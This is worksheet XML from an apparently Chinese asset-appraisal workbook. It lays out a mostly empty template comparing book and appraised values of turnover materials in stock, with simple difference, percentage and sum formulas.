        <is>
          <t>金额</t>
        </is>
      </c>
      <c r="L6" s="594" t="n"/>
      <c r="M6" s="594" t="n"/>
      <c r="N6" s="594" t="n"/>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="314">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="284" t="n"/>
      <c r="C7" s="198" t="n"/>
      <c r="D7" s="313" t="n"/>
      <c r="E7" s="313" t="n"/>
      <c r="F7" s="555" t="n"/>
      <c r="G7" s="555" t="n"/>
      <c r="H7" s="555" t="n"/>
      <c r="I7" s="555" t="n"/>
      <c r="J7" s="555" t="n"/>
      <c r="K7" s="555" t="n"/>
      <c r="L7" s="555">
        <f>K7-H7</f>
        <v/>
      </c>
      <c r="M7" s="555">
        <f>IF(H7=0,"",L7/H7*100)</f>
        <v/>
      </c>
      <c r="N7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customFormat="1" customHeight="1" s="314">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="284" t="n"/>
      <c r="C8" s="198" t="n"/>
      <c r="D8" s="313" t="n"/>
      <c r="E8" s="313" t="n"/>
      <c r="F8" s="555" t="n"/>
      <c r="G8" s="555" t="n"/>
      <c r="H8" s="555" t="n"/>
      <c r="I8" s="555" t="n"/>
      <c r="J8" s="555" t="n"/>
      <c r="K8" s="555" t="n"/>
      <c r="L8" s="555">
        <f>K8-H8</f>
        <v/>
      </c>
      <c r="M8" s="555">
        <f>IF(H8=0,"",L8/H8*100)</f>
        <v/>
      </c>
      <c r="N8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="383" t="n"/>
      <c r="E9" s="383" t="n"/>
      <c r="F9" s="555" t="n"/>
      <c r="G9" s="555" t="n"/>
      <c r="H9" s="555" t="n"/>
      <c r="I9" s="555" t="n"/>
      <c r="J9" s="555" t="n"/>
      <c r="K9" s="555" t="n"/>
      <c r="L9" s="555">
        <f>K9-H9</f>
        <v/>
      </c>
      <c r="M9" s="555">
        <f>IF(H9=0,"",L9/H9*100)</f>
        <v/>
      </c>
      <c r="N9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="383" t="n"/>
      <c r="E10" s="383" t="n"/>
      <c r="F10" s="555" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="555" t="n"/>
      <c r="J10" s="555" t="n"/>
      <c r="K10" s="555" t="n"/>
      <c r="L10" s="555">
        <f>K10-H10</f>
        <v/>
      </c>
      <c r="M10" s="555">
        <f>IF(H10=0,"",L10/H10*100)</f>
        <v/>
      </c>
      <c r="N10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customHeight="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="383" t="n"/>
      <c r="E11" s="383" t="n"/>
      <c r="F11" s="555" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="555" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="555" t="n"/>
      <c r="L11" s="555">
        <f>K11-H11</f>
        <v/>
      </c>
      <c r="M11" s="555">
        <f>IF(H11=0,"",L11/H11*100)</f>
        <v/>
      </c>
      <c r="N11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customHeight="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="383" t="n"/>
      <c r="E12" s="383" t="n"/>
      <c r="F12" s="555" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="555" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="555" t="n"/>
      <c r="L12" s="555">
        <f>K12-H12</f>
        <v/>
      </c>
      <c r="M12" s="555">
        <f>IF(H12=0,"",L12/H12*100)</f>
        <v/>
      </c>
      <c r="N12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customHeight="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="383" t="n"/>
      <c r="E13" s="383" t="n"/>
      <c r="F13" s="555" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="555" t="n"/>
      <c r="J13" s="555" t="n"/>
      <c r="K13" s="555" t="n"/>
      <c r="L13" s="555">
        <f>K13-H13</f>
        <v/>
      </c>
      <c r="M13" s="555">
        <f>IF(H13=0,"",L13/H13*100)</f>
        <v/>
      </c>
      <c r="N13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customHeight="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="383" t="n"/>
      <c r="E14" s="383" t="n"/>
      <c r="F14" s="555" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="555" t="n"/>
      <c r="J14" s="555" t="n"/>
      <c r="K14" s="555" t="n"/>
      <c r="L14" s="555">
        <f>K14-H14</f>
        <v/>
      </c>
      <c r="M14" s="555">
        <f>IF(H14=0,"",L14/H14*100)</f>
        <v/>
      </c>
      <c r="N14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customHeight="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="383" t="n"/>
      <c r="E15" s="383" t="n"/>
      <c r="F15" s="555" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="555" t="n"/>
      <c r="J15" s="555" t="n"/>
      <c r="K15" s="555" t="n"/>
      <c r="L15" s="555">
        <f>K15-H15</f>
        <v/>
      </c>
      <c r="M15" s="555">
        <f>IF(H15=0,"",L15/H15*100)</f>
        <v/>
      </c>
      <c r="N15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customHeight="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="383" t="n"/>
      <c r="E16" s="383" t="n"/>
      <c r="F16" s="555" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="555" t="n"/>
      <c r="J16" s="555" t="n"/>
      <c r="K16" s="555" t="n"/>
      <c r="L16" s="555">
        <f>K16-H16</f>
        <v/>
      </c>
      <c r="M16" s="555">
        <f>IF(H16=0,"",L16/H16*100)</f>
        <v/>
      </c>
      <c r="N16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customHeight="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="383" t="n"/>
      <c r="E17" s="383" t="n"/>
      <c r="F17" s="555" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="555" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="555" t="n"/>
      <c r="L17" s="555">
        <f>K17-H17</f>
        <v/>
      </c>
      <c r="M17" s="555">
        <f>IF(H17=0,"",L17/H17*100)</f>
        <v/>
      </c>
      <c r="N17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customHeight="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="383" t="n"/>
      <c r="E18" s="383" t="n"/>
      <c r="F18" s="555" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="555" t="n"/>
      <c r="J18" s="555" t="n"/>
      <c r="K18" s="555" t="n"/>
      <c r="L18" s="555">
        <f>K18-H18</f>
        <v/>
      </c>
      <c r="M18" s="555">
        <f>IF(H18=0,"",L18/H18*100)</f>
        <v/>
      </c>
      <c r="N18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customHeight="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="383" t="n"/>
      <c r="E19" s="383" t="n"/>
      <c r="F19" s="555" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="555" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="555" t="n"/>
      <c r="L19" s="555">
        <f>K19-H19</f>
        <v/>
      </c>
      <c r="M19" s="555">
        <f>IF(H19=0,"",L19/H19*100)</f>
        <v/>
      </c>
      <c r="N19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customHeight="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="383" t="n"/>
      <c r="E20" s="383" t="n"/>
      <c r="F20" s="555" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="555" t="n"/>
      <c r="J20" s="555" t="n"/>
      <c r="K20" s="555" t="n"/>
      <c r="L20" s="555">
        <f>K20-H20</f>
        <v/>
      </c>
      <c r="M20" s="555">
        <f>IF(H20=0,"",L20/H20*100)</f>
        <v/>
      </c>
      <c r="N20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customHeight="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="383" t="n"/>
      <c r="E21" s="383" t="n"/>
      <c r="F21" s="555" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="555" t="n"/>
      <c r="J21" s="555" t="n"/>
      <c r="K21" s="555" t="n"/>
      <c r="L21" s="555">
        <f>K21-H21</f>
        <v/>
      </c>
      <c r="M21" s="555">
        <f>IF(H21=0,"",L21/H21*100)</f>
        <v/>
      </c>
      <c r="N21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customHeight="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="383" t="n"/>
      <c r="E22" s="383" t="n"/>
      <c r="F22" s="555" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="555" t="n"/>
      <c r="J22" s="555" t="n"/>
      <c r="K22" s="555" t="n"/>
      <c r="L22" s="555">
        <f>K22-H22</f>
        <v/>
      </c>
      <c r="M22" s="555">
        <f>IF(H22=0,"",L22/H22*100)</f>
        <v/>
      </c>
      <c r="N22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customHeight="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="383" t="n"/>
      <c r="E23" s="383" t="n"/>
      <c r="F23" s="555" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="555" t="n"/>
      <c r="I23" s="555" t="n"/>
      <c r="J23" s="555" t="n"/>
      <c r="K23" s="555" t="n"/>
      <c r="L23" s="555">
        <f>K23-H23</f>
        <v/>
      </c>
      <c r="M23" s="555">
        <f>IF(H23=0,"",L23/H23*100)</f>
        <v/>
      </c>
      <c r="N23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customHeight="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="383" t="n"/>
      <c r="E24" s="383" t="n"/>
      <c r="F24" s="555" t="n"/>
      <c r="G24" s="555" t="n"/>
      <c r="H24" s="555" t="n"/>
      <c r="I24" s="555" t="n"/>
      <c r="J24" s="555" t="n"/>
      <c r="K24" s="555" t="n"/>
      <c r="L24" s="555">
        <f>K24-H24</f>
        <v/>
      </c>
      <c r="M24" s="555">
        <f>IF(H24=0,"",L24/H24*100)</f>
        <v/>
      </c>
      <c r="N24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customHeight="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="383" t="n"/>
      <c r="E25" s="383" t="n"/>
      <c r="F25" s="555" t="n"/>
      <c r="G25" s="555" t="n"/>
      <c r="H25" s="555" t="n"/>
      <c r="I25" s="555" t="n"/>
      <c r="J25" s="555" t="n"/>
      <c r="K25" s="555" t="n"/>
      <c r="L25" s="555">
        <f>K25-H25</f>
        <v/>
      </c>
      <c r="M25" s="555">
        <f>IF(H25=0,"",L25/H25*100)</f>
        <v/>
      </c>
      <c r="N25" s="383" t="n"/>
    </row>
    <row r="26" ht="16.5" customHeight="1" s="415">
      <c r="A26" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B26" s="380" t="inlineStr">
        <is>
          <t>合          计</t>
        </is>
      </c>
      <c r="C26" s="567" t="n"/>
      <c r="D26" s="383" t="n"/>
      <c r="E26" s="383" t="n"/>
      <c r="F26" s="555">
        <f>ROUND(SUM(F7:F25),2)</f>
        <v/>
      </c>
      <c r="G26" s="555" t="n"/>
      <c r="H26" s="555">
        <f>ROUND(SUM(H7:H25),2)</f>
        <v/>
      </c>
      <c r="I26" s="555">
        <f>ROUND(SUM(I7:I25),2)</f>
        <v/>
      </c>
      <c r="J26" s="555" t="n"/>
      <c r="K26" s="555">
        <f>ROUND(SUM(K7:K25),2)</f>
        <v/>
      </c>
      <c r="L26" s="555">
        <f>K26-H26</f>
        <v/>
      </c>
      <c r="M26" s="555">
        <f>IF(H26=0,"",L26/H26*100)</f>
        <v/>
      </c>
      <c r="N26" s="383" t="n"/>
    </row>
    <row r="27" s="415">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B27" s="185" t="inlineStr">
        <is>
          <t>减：存货跌价准备</t>
        </is>
      </c>
      <c r="C27" s="567" t="n"/>
      <c r="D27" s="381" t="n"/>
      <c r="E27" s="381" t="n"/>
      <c r="F27" s="555" t="n"/>
      <c r="G27" s="555" t="n"/>
      <c r="H27" s="555" t="n"/>
      <c r="I27" s="555" t="n"/>
      <c r="J27" s="555" t="n"/>
      <c r="K27" s="555" t="n"/>
      <c r="L27" s="555">
        <f>K27-H27</f>
        <v/>
      </c>
      <c r="M27" s="555">
        <f>IF(H27=0,"",L27/H27*100)</f>
        <v/>
      </c>
      <c r="N27" s="381" t="n"/>
    </row>
    <row r="28" s="415">
      <c r="A28" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B28" s="380" t="inlineStr">
        <is>
          <t>合          计</t>
        </is>
      </c>
      <c r="C28" s="567" t="n"/>
      <c r="D28" s="383" t="n"/>
      <c r="E28" s="383" t="n"/>
      <c r="F28" s="555">
        <f>ROUND(F26-F27,2)</f>
        <v/>
      </c>
      <c r="G28" s="555" t="n"/>
      <c r="H28" s="555">
        <f>ROUND(H26-H27,2)</f>
        <v/>
      </c>
      <c r="I28" s="555">
        <f>ROUND(I26-I27,2)</f>
        <v/>
      </c>
      <c r="J28" s="555" t="n"/>
      <c r="K28" s="555">
        <f>ROUND(K26-K27,2)</f>
        <v/>
      </c>
      <c r="L28" s="555">
        <f>K28-H28</f>
        <v/>
      </c>
      <c r="M28" s="555">
        <f>IF(H28=0,"",L28/H28*100)</f>
        <v/>
      </c>
      <c r="N28" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="14">
    <mergeCell ref="E5:E6"/>
    <mergeCell ref="N5:N6"/>
    <mergeCell ref="F5:H5"/>
    <mergeCell ref="B1:N1"/>
    <mergeCell ref="I5:K5"/>
    <mergeCell ref="B28:C28"/>
    <mergeCell ref="M5:M6"/>
    <mergeCell ref="C5:C6"/>
    <mergeCell ref="B26:C26"/>
    <mergeCell ref="B27:C27"/>
    <mergeCell ref="D5:D6"/>
    <mergeCell ref="B2:N2"/>
    <mergeCell ref="B5:B6"/>
    <mergeCell ref="L5:L6"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:N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8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 codeName="Sheet30">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:N28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9" customWidth="1" style="410" min="1" max="1"/>
    <col width="4.83333333333333" customWidth="1" style="410" min="2" max="2"/>
    <col width="23.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="7.16666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col hidden="1" width="9.66666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col width="10.6666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col width="8.66666666666667" customWidth="1" style="317" min="7" max="7"/>
    <col width="11.3333333333333" customWidth="1" style="410" min="8" max="8"/>
    <col outlineLevel="1" width="9.66666666666667" customWidth="1" style="410" min="9" max="9"/>
    <col outlineLevel="1" width="7.33333333333333" customWidth="1" style="410" min="10" max="10"/>
    <col outlineLevel="1" width="12.6666666666667" customWidth="1" style="410" min="11" max="11"/>
    <col outlineLevel="1" width="8.83333333333333" customWidth="1" style="410" min="12" max="12"/>
    <col outlineLevel="1" width="7.66666666666667" customWidth="1" style="410" min="13" max="13"/>
    <col width="11.8333333333333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存货—在库周转材料评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="14" customHeight="1" s="415">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3" ht="14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373" t="n"/>
      <c r="H3" s="373" t="n"/>
      <c r="I3" s="373" t="n"/>
      <c r="J3" s="373" t="n"/>
      <c r="K3" s="373" t="n"/>
      <c r="L3" s="373" t="n"/>
      <c r="M3" s="373" t="n"/>
      <c r="N3" s="402" t="inlineStr">
        <is>
          <t>表3-9-3</t>
        </is>
      </c>
    </row>
    <row r="4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18" t="n"/>
      <c r="H4" s="376" t="n"/>
      <c r="I4" s="376" t="n"/>
      <c r="J4" s="376" t="n"/>
      <c r="K4" s="376" t="n"/>
      <c r="L4" s="376" t="n"/>
      <c r="M4" s="376" t="n"/>
      <c r="N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名称及规格型号</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>计量单位</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>存放地点</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="G5" s="593" t="n"/>
      <c r="H5" s="567" t="n"/>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="J5" s="593" t="n"/>
      <c r="K5" s="567" t="n"/>
      <c r="L5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="M5" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="N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380" t="inlineStr">
        <is>
          <t>数量</t>
        </is>
      </c>
      <c r="G6" s="380" t="inlineStr">
        <is>
          <t>单价</t>
        </is>
      </c>
      <c r="H6" s="380" t="inlineStr">
        <is>
          <t>金额</t>
        </is>
      </c>
      <c r="I6" s="380" t="inlineStr">
        <is>
          <t>实际数量</t>
        </is>
      </c>
      <c r="J6" s="380" t="inlineStr">
        <is>
          <t>评估单价</t>
        </is>
      </c>
      <c r="K6" s="380" t="inlineStr">
        <is>
          <t>金额</t>
        </is>
      </c>
      <c r="L6" s="594" t="n"/>
      <c r="M6" s="594" t="n"/>
      <c r="N6" s="594" t="n"/>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="314">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="284" t="n"/>
      <c r="C7" s="198" t="n"/>
      <c r="D7" s="313" t="n"/>
      <c r="E7" s="313" t="n"/>
      <c r="F7" s="555" t="n"/>
      <c r="G7" s="555" t="n"/>
      <c r="H7" s="555" t="n"/>
      <c r="I7" s="555" t="n"/>
      <c r="J7" s="555" t="n"/>
      <c r="K7" s="555" t="n"/>
      <c r="L7" s="555">
        <f>K7-H7</f>
        <v/>
      </c>
      <c r="M7" s="555">
        <f>IF(H7=0,"",L7/H7*100)</f>
        <v/>
      </c>
      <c r="N7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customFormat="1" customHeight="1" s="314">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="284" t="n"/>
      <c r="C8" s="198" t="n"/>
      <c r="D8" s="313" t="n"/>
      <c r="E8" s="313" t="n"/>
      <c r="F8" s="555" t="n"/>
      <c r="G8" s="555" t="n"/>
      <c r="H8" s="555" t="n"/>
      <c r="I8" s="555" t="n"/>
      <c r="J8" s="555" t="n"/>
      <c r="K8" s="555" t="n"/>
      <c r="L8" s="555">
        <f>K8-H8</f>
        <v/>
      </c>
      <c r="M8" s="555">
        <f>IF(H8=0,"",L8/H8*100)</f>
        <v/>
      </c>
      <c r="N8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="383" t="n"/>
      <c r="E9" s="383" t="n"/>
      <c r="F9" s="555" t="n"/>
      <c r="G9" s="555" t="n"/>
      <c r="H9" s="555" t="n"/>
      <c r="I9" s="555" t="n"/>
      <c r="J9" s="555" t="n"/>
      <c r="K9" s="555" t="n"/>
      <c r="L9" s="555">
        <f>K9-H9</f>
        <v/>
      </c>
      <c r="M9" s="555">
        <f>IF(H9=0,"",L9/H9*100)</f>
        <v/>
      </c>
      <c r="N9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="383" t="n"/>
      <c r="E10" s="383" t="n"/>
      <c r="F10" s="555" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="555" t="n"/>
      <c r="J10" s="555" t="n"/>
      <c r="K10" s="555" t="n"/>
      <c r="L10" s="555">
        <f>K10-H10</f>
        <v/>
      </c>
      <c r="M10" s="555">
        <f>IF(H10=0,"",L10/H10*100)</f>
        <v/>
      </c>
      <c r="N10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customHeight="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="383" t="n"/>
      <c r="E11" s="383" t="n"/>
      <c r="F11" s="555" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="555" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="555" t="n"/>
      <c r="L11" s="555">
        <f>K11-H11</f>
        <v/>
      </c>
      <c r="M11" s="555">
        <f>IF(H11=0,"",L11/H11*100)</f>
        <v/>
      </c>
      <c r="N11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customHeight="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="383" t="n"/>
      <c r="E12" s="383" t="n"/>
      <c r="F12" s="555" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="555" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="555" t="n"/>
      <c r="L12" s="555">
        <f>K12-H12</f>
        <v/>
      </c>
      <c r="M12" s="555">
        <f>IF(H12=0,"",L12/H12*100)</f>
        <v/>
      </c>
      <c r="N12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customHeight="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="383" t="n"/>
      <c r="E13" s="383" t="n"/>
      <c r="F13" s="555" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="555" t="n"/>
      <c r="J13" s="555" t="n"/>
      <c r="K13" s="555" t="n"/>
      <c r="L13" s="555">
        <f>K13-H13</f>
        <v/>
      </c>
      <c r="M13" s="555">
        <f>IF(H13=0,"",L13/H13*100)</f>
        <v/>
      </c>
      <c r="N13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customHeight="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="383" t="n"/>
      <c r="E14" s="383" t="n"/>
      <c r="F14" s="555" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="555" t="n"/>
      <c r="J14" s="555" t="n"/>
      <c r="K14" s="555" t="n"/>
      <c r="L14" s="555">
        <f>K14-H14</f>
        <v/>
      </c>
      <c r="M14" s="555">
        <f>IF(H14=0,"",L14/H14*100)</f>
        <v/>
      </c>
      <c r="N14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customHeight="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="383" t="n"/>
      <c r="E15" s="383" t="n"/>
      <c r="F15" s="555" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="555" t="n"/>
      <c r="J15" s="555" t="n"/>
      <c r="K15" s="555" t="n"/>
      <c r="L15" s="555">
        <f>K15-H15</f>
        <v/>
      </c>
      <c r="M15" s="555">
        <f>IF(H15=0,"",L15/H15*100)</f>
        <v/>
      </c>
      <c r="N15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customHeight="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="383" t="n"/>
      <c r="E16" s="383" t="n"/>
      <c r="F16" s="555" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="555" t="n"/>
      <c r="J16" s="555" t="n"/>
      <c r="K16" s="555" t="n"/>
      <c r="L16" s="555">
        <f>K16-H16</f>
        <v/>
      </c>
      <c r="M16" s="555">
        <f>IF(H16=0,"",L16/H16*100)</f>
        <v/>
      </c>
      <c r="N16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customHeight="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="383" t="n"/>
      <c r="E17" s="383" t="n"/>
      <c r="F17" s="555" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="555" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="555" t="n"/>
      <c r="L17" s="555">
        <f>K17-H17</f>
        <v/>
      </c>
      <c r="M17" s="555">
        <f>IF(H17=0,"",L17/H17*100)</f>
        <v/>
      </c>
      <c r="N17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customHeight="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="383" t="n"/>
      <c r="E18" s="383" t="n"/>
      <c r="F18" s="555" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="555" t="n"/>
      <c r="J18" s="555" t="n"/>
      <c r="K18" s="555" t="n"/>
      <c r="L18" s="555">
        <f>K18-H18</f>
        <v/>
      </c>
      <c r="M18" s="555">
        <f>IF(H18=0,"",L18/H18*100)</f>
        <v/>
      </c>
      <c r="N18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customHeight="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="383" t="n"/>
      <c r="E19" s="383" t="n"/>
      <c r="F19" s="555" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="555" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="555" t="n"/>
      <c r="L19" s="555">
        <f>K19-H19</f>
        <v/>
      </c>
      <c r="M19" s="555">
        <f>IF(H19=0,"",L19/H19*100)</f>
        <v/>
      </c>
      <c r="N19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customHeight="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="383" t="n"/>
      <c r="E20" s="383" t="n"/>
      <c r="F20" s="555" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="555" t="n"/>
      <c r="J20" s="555" t="n"/>
      <c r="K20" s="555" t="n"/>
      <c r="L20" s="555">
        <f>K20-H20</f>
        <v/>
      </c>
      <c r="M20" s="555">
